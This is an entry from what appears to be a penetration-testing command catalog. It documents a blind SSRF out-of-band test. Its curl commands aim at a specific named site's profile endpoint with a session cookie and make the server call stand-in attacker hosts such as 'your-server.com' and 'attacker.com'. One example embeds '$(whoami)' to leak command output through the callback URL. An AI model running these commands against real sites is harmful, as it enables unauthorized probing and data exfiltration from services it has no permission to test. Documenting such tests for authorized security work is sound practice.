---
id: cmd-uuid-3456
data: >-
  curl -X POST https://chat.makerdao.com/account/profile -H "Content-Type:
  application/json" -H "Cookie: session=your_session_cookie_here" -d
  '{"profile_data": {"external_url": "http://your-server.com/ssrf-detect"}}'
tags:
  - ssrf
  - oob
  - web-testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.494Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-oob

## Command

```bash
curl -X POST https://chat.makerdao.com/account/profile \
  -H "Content-Type: application/json" \
  -H "Cookie: session=your_session_cookie_here" \
  -d '{"profile_data": {"external_url": "http://your-server.com/ssrf-detect"}}'
```

## Description

This command performs an out-of-band (OOB) test for blind SSRF by directing the server to fetch from an attacker-controlled endpoint, allowing detection via access logs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | JSON header | Yes |
| `-H "Cookie: ..."` | Auth cookie | Yes |
| `-d '...' ` | Payload with OOB URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/vuln -d '{"url": "http://attacker.com/log"}'
```

### Advanced Usage

```bash
curl -X POST https://chat.makerdao.com/account/profile -H "Cookie: session=abc" -d '{"external_url": "http://your-server.com?cb=$(whoami)"}' -v
```

## Expected Output

Standard endpoint response; check attacker server for incoming request as success indicator.

## Related

- [[Related Procedure: Exploit-Blind-SSRF-via-Profile-Endpoint]]
